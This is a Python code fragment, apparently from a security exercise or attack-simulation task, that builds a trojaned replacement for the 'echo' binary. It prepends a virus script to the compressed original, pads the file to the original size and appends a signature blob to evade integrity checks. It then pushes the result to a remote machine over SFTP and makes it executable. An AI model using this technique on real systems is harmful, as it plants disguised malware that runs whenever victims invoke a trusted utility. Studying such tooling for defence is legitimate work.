    with open(VIRUS_FILE, "r") as f:
        virus_file_content = f.read()
        virus_file_content = modify_virus_file(virus_file_content=virus_file_content)
        virus_file_content = re.sub("ECHO_ZIP_SIZE=0",f"ECHO_ZIP_SIZE={echo_zip_size}",virus_file_content)
        VIRUS_SIZE = len(virus_file_content.strip().encode())
        virus_file_content = re.sub("VIRUS_SIZE=396",f"VIRUS_SIZE={VIRUS_SIZE}",virus_file_content)
    
    with open("/app/echo","wb") as f:
        f.write(virus_file_content.strip().encode())
        with open("/app/echo.gz","rb") as zf:
            echo_zip_content = zf.read()
            f.write(echo_zip_content)

        padding_size = echo_size - echo_zip_size - VIRUS_SIZE - 512 # reserve 512 bytes for signature
        
        # print(f'echo size: {echo_size}')
        # print(f'Virus size: {VIRUS_SIZE}')
        # print(f'padding size: {padding_size}')
        # print(f'echo_zip_size: {echo_zip_size}')

        if padding_size < 0:
            print("Something is wrong when adding padding!")
        f.write(b'\x00' * padding_size)
    
        with open("sig512", "rb") as sig_f:
            signature512 = sig_f.read()
            f.write(signature512)

    sftp_client = ssh_client.open_sftp()
    sftp_client.put("/app/echo","/app/echo")
    sftp_client.close()
    
    ssh_client.exec_command(f"chmod +x /app/echo")
    # print(f'Original echo size: {echo_size}')
    ssh_client.close()

def modify_virus_file(virus_file_content):
